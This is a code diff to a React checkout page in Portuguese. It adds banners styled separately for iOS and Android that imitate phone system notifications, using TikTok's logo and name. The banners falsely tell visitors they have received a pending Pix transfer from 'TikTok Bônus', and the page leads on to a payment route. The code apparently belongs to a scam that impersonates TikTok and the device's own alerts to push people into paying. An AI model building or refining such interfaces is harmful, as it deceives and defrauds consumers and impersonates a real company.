@@ -57,8 +57,7 @@ const Checkout = () => {
     navigate("/pagamento");
   };
 
-  const now = new Date();
-  const notifTime = `${pad(now.getHours())}:${pad(now.getMinutes())}`;
+  const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
 
   return (
     <div className="flex min-h-screen flex-col bg-white relative">
@@ -69,32 +68,53 @@ const Checkout = () => {
           onClick={() => setDismissNotification(true)}
           style={{ animation: "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)" }}
         >
-          <div
-            className="rounded-[20px] p-4 mx-auto max-w-md border border-white/10"
-            style={{
-              background: "linear-gradient(135deg, rgba(40,40,40,0.85) 0%, rgba(30,30,30,0.9) 100%)",
-              backdropFilter: "blur(40px)",
-              WebkitBackdropFilter: "blur(40px)",
-              boxShadow: "0 8px 32px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.08)",
-            }}
-          >
-            <div className="flex items-start gap-3">
-              <img
-                src={tiktokLogo}
-                alt="TikTok"
-                className="h-11 w-11 rounded-[12px] object-contain bg-black p-1.5 shrink-0 shadow-sm"
-              />
-              <div className="flex-1 min-w-0">
-                <div className="flex items-baseline justify-between gap-2 mb-0.5">
-                  <span className="text-[15px] font-bold text-white leading-tight">Pix Pendente - TikTok Bônus</span>
-                  <span className="text-[12px] text-white/50 shrink-0 font-medium">agora</span>
+          {isIOS ? (
+            /* ── iOS Style ── */
+            <div
+              className="rounded-[22px] p-3.5 mx-auto max-w-md border border-white/20"
+              style={{
+                background: "linear-gradient(135deg, rgba(45,45,45,0.92) 0%, rgba(35,35,35,0.95) 100%)",
+                backdropFilter: "blur(50px)",
+                WebkitBackdropFilter: "blur(50px)",
+                boxShadow: "0 10px 40px rgba(0,0,0,0.35), inset 0 0.5px 0 rgba(255,255,255,0.1)",
+              }}
+            >
+              <div className="flex items-center gap-2.5 mb-1.5">
+                <img src={tiktokLogo} alt="TikTok" className="h-5 w-5 rounded-[5px] object-contain bg-black p-0.5 shrink-0" />
+                <span className="text-[11px] font-semibold text-white/60 uppercase tracking-wider flex-1">TikTok Bônus</span>
+                <span className="text-[11px] text-white/40 font-medium">agora</span>
+              </div>
+              <p className="text-[15px] font-semibold text-white leading-tight mb-0.5">Pix Pendente</p>
+              <p className="text-[14px] text-white/75 leading-snug">
+                Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de TikTok Bônus.
+              </p>
+            </div>
+          ) : (
+            /* ── Android Style ── */
+            <div
+              className="rounded-2xl p-4 mx-auto max-w-md"
+              style={{
+                background: "#2a2a2e",
+                boxShadow: "0 6px 24px rgba(0,0,0,0.3)",
+              }}
+            >
+              <div className="flex items-center gap-2 mb-2">
+                <img src={tiktokLogo} alt="TikTok" className="h-4 w-4 rounded-sm object-contain bg-black shrink-0" />
+                <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
+                <span className="text-[11px] text-white/35 mx-0.5">•</span>
+                <span className="text-[11px] text-white/35">agora</span>
+              </div>
+              <div className="flex items-start gap-3">
+                <div className="flex-1 min-w-0">
+                  <p className="text-[14px] font-semibold text-white leading-tight mb-0.5">Pix Pendente - TikTok Bônus</p>
+                  <p className="text-[13px] text-white/70 leading-snug">
+                    Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de TikTok Bônus.
+                  </p>
                 </div>
-                <p className="text-[13px] text-white/80 leading-snug mt-0.5">
-                  Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de TikTok Bônus.
-                </p>
+                <img src={tiktokLogo} alt="TikTok" className="h-10 w-10 rounded-xl object-contain bg-black p-1.5 shrink-0 mt-0.5" />
               </div>
             </div>
-          </div>
+          )}
         </div>
       )}
       {/* Logo */}
